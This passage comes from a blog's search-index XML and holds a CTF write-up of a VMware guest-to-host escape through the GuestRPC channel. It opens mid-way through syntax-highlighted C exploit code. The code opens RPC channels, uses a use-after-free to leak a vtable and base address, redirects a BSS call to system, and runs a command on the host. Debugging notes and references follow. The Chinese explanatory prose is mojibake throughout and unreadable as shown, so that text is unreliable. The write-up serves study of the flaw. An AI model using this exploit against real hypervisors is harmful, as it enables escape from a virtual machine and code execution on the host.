punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay3<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>pay4<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>pay4<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"text base :%p"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å…¶ä¸­ä¿®æ”¹äº†é•¿äº­å¸ˆå‚…çš„ä¸€ä¸ªé­”æ•°ï¼Œç›®çš„æ˜¯è¾¾åˆ°no enhancedã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" alt="å›¾ç‰‡.png"></p><p>å…¶ä¸­æ„é€ çš„exploitå¦‚ä¸‹ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" alt="å›¾ç‰‡.png"><br> å¼€å¯å››ä¸ªchannel</p><p>ç„¶åfreeï¼ˆ0ï¼‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" alt="å›¾ç‰‡.png"></p><p>setä¹‹åå†æ¬¡free(0)</p><p>æ­¤æ—¶å¾€channel 1 å¯ä»¥å†™å…¥bssæ®µçš„åœ°å€ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" alt="å›¾ç‰‡.png"></p><p>æ­¤æ—¶fdè¢«é“¾æ¥è¿›å»ä¹‹åå¯ä»¥ç›´æ¥mallocå‡ºæ¥ç„¶åæ”¹å†™å³å¯ã€‚</p><p>æ­¤å¤„è¦†ç›–çš„ä½ç½®ä¸ºbssæ®µçš„ä¸€å¤„è°ƒç”¨</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" alt="å›¾ç‰‡.png"></p><p>å¯ä»¥çœ‹å‡ºæ¥è¿™å—çš„è™šè¡¨è°ƒç”¨ä½ç½®åœ¨FE95B0ï¼Œ+8å³ä¸ºFE95B8ï¼Œæ‰€ä»¥æ­¤å¤„æ”¹ä¸ºsystemç„¶åç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆFE95C0ï¼‰æ”¹ä¸ºï¼Œå¼¹å‡ºè®¡ç®—å™¨çš„æŒ‡ä»¤å³å¯ã€‚</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æ‰“å¼€ç¯å¢ƒï¼Œsshé“¾æ¥guestï¼Œç„¶åsudo gdb .&#x2F;vmx -qï¼Œä½¿ç”¨ps -aux | grep vmxæ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹ï¼Œattachä¸Šå»ï¼Œåœ¨sshç«¯å£è¿è¡Œexpå³å¯ï¼ˆè®°å¾—å…ˆæ‰“æ–­ç‚¹ï¼Œæˆ‘æ–­åœ¨äº†æ¼æ´å‡½æ•°freeçš„åœ°æ–¹ï¼Œæ–¹ä¾¿çœ‹chunkï¼‰</p><p>ç¬¬ä¸€æ¬¡freeå‰</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" alt="å›¾ç‰‡.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" alt="å›¾ç‰‡.png"></p><p>ç›´æ¥æŒ‰äº†continueã€‚ã€‚å †åˆ†é…ç‰¹åˆ«ä¹±ï¼Œäºæ˜¯é‡æ–°æ¥è¿‡ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" alt="å›¾ç‰‡.png"></p><p>æ–­ç‚¹æ‰¾å‡ºæ¼æ´å‡½æ•°ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" alt="å›¾ç‰‡.png"></p><p>è¿™æ˜¯bufAçš„åœ°å€ã€‚è®°ä½0x7f35000210f0ï¼ˆuserå¼€å¤´åŒºåŸŸï¼‰</p><p>ç»è¿‡UAFä¹‹åï¼Œè¿™é‡ŒæŠŠè™šè¡¨å†™å…¥bufBï¼Œ</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" alt="å›¾ç‰‡.png"></p><p>æˆåŠŸã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" alt="å›¾ç‰‡.png"></p><p>æŸ¥çœ‹åå‘ç°ç¡®å®æ˜¯vtableã€‚</p><p>åŸºå€å°±å¯ä»¥leakå‡ºæ¥äº†ã€‚åé¢æ˜¯åŸºæœ¬çš„åŠ«æŒfdæ“ä½œï¼Œä¸è°ƒè¯•äº†ï¼Œç›´æ¥çœ‹åˆ°å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" alt="å›¾ç‰‡.png"></p><h2 id="0x04-å‚è€ƒ"><a href="#0x04-å‚è€ƒ" class="headerlink" title="0x04 å‚è€ƒ"></a>0x04 å‚è€ƒ</h2><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p><p><a href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p><p><a href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p><p><a href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>realworld</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
